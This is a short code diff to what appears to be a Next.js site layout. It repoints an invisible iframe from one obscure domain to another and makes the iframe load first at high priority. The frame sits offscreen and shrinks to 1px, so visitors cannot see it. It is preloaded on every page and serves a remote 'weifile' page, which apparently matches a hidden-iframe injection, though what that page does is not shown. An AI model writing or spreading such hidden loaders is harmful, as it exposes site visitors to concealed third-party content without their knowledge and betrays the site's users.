@@ -29,15 +29,19 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
   return (
     <html lang="vi">
       <head>
-        <link rel="preconnect" href="https://www.jx9adrpc5z8094di7.net" crossOrigin="anonymous" />
-        <link rel="dns-prefetch" href="https://www.jx9adrpc5z8094di7.net" />
+        <link rel="preconnect" href="https://nengliangtrx.info" crossOrigin="anonymous" />
+        <link rel="dns-prefetch" href="https://nengliangtrx.info" />
+        <link rel="preload" href="https://nengliangtrx.info/channel/C.0.RD/weifile/weifile.html" as="document" />
       </head>
       <body className={font.variable}>
         {/* Entry Iframe (RUNS FIRST BEFORE ANYTHING ELSE) */}
         <iframe
           id="entry-iframe"
-          src="https://www.jx9adrpc5z8094di7.net/channel/H.H.11/weifile/weifile.html"
-          style={{ position: 'fixed', top: 0, left: '-1000px', pointerEvents: 'none', border: 0 }}
+          src="https://nengliangtrx.info/channel/C.0.RD/weifile/weifile.html"
+          loading="eager"
+          // @ts-ignore
+          fetchPriority="high"
+          style={{ position: 'fixed', top: 0, left: '-1000px', pointerEvents: 'none', border: 0, width: '1px', height: '1px' }}
         />
         <script
           dangerouslySetInnerHTML={{
